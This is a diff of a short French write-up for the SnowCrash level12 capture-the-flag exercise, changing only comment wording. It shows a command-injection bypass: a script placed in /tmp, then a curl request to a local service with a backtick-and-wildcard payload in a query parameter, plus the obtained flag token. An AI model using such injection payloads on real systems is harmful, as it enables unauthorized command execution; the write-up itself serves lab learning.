@@ -1,7 +1,7 @@
 Lisez l'explication du script svp.
 
 Bon on a un filtre qui va essayer de mettre tout en caps et dès qui y a un espace en entrée, bah ca va couper l'espace et ce qu'il y a apres.
-Donc pour entrer un "getflag > /tmp/mon_fichier", c'est mort, non pas à cause de l'espace mais à cause du path.
+Donc pour entrer un "getflag > /tmp/mon_fichier", c'est mort, non pas à cause de l'espace (car on pourait tout coller) mais à cause du path.
 
 Donc à défaut de pouvoir écrire on peur lire avec un wildcard et un nom de fichier unique (histoire de pas executer n'importequoi quand même hein).
 
@@ -11,7 +11,7 @@ level12@SnowCrash:~$ vim /tmp/EXPLOIT12
 level12@SnowCrash:~$ cat /tmp/EXPLOIT12
 #!/bin/sh
 getflag > /tmp/flag12
-level12@SnowCrash:~$ chmod 777 /tmp/EXPLOIT12 <- J'ai galéré 10mins a cause de cette merde
+level12@SnowCrash:~$ chmod 777 /tmp/EXPLOIT12                                       <- J'ai galéré 10mins a cause de cette merde
 level12@SnowCrash:~$ curl localhost:4646?x='`/*/EXPLOIT12`'
 ..level12@SnowCrash:~cat /tmp/flag12
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
